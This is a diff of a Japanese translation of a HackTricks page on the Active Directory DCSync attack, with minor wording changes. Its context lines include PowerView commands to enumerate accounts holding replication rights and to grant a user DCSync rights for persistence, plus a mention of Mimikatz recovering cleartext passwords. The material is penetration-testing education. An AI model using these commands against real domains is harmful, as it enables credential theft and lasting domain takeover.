@@ -18,7 +18,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
@@ -30,12 +30,12 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 **DCSyncに関する重要な注意事項：**
 
 * **DCSync攻撃は、ドメインコントローラーの動作をシミュレートし、他のドメインコントローラーに情報を複製するよう要求します**。これは、ディレクトリ複製サービスリモートプロトコル（MS-DRSR）を使用します。MS-DRSRはActive Directoryの有効かつ必要な機能であるため、オフにしたり無効にしたりすることはできません。
-* デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、およびDomain Controllers**グループのみが必要な特権を持っています。
-*  reversible encryptionで保存されたアカウントのパスワードがある場合、Mimikatzにはパスワードを平文で返すオプションがあります。
+* デフォルトでは、**ドメイン管理者、エンタープライズ管理者、管理者、およびドメインコントローラー**グループのみが必要な特権を持っています。
+* もしアカウントのパスワードが可逆暗号化で保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。
 
-### Enumeration
+### 列挙
 
-`powerview`を使用して、これらの権限を持つ人を確認します：
+`powerview`を使用して、これらの権限を持つユーザーを確認します：
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
@@ -62,7 +62,7 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 
 ### 永続性
 
-ドメイン管理者であれば、`powerview`を使用して任意のユーザーにこの権限を付与できます：
+ドメイン管理者であれば、`powerview`の助けを借りて、任意のユーザーにこの権限を付与できます：
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
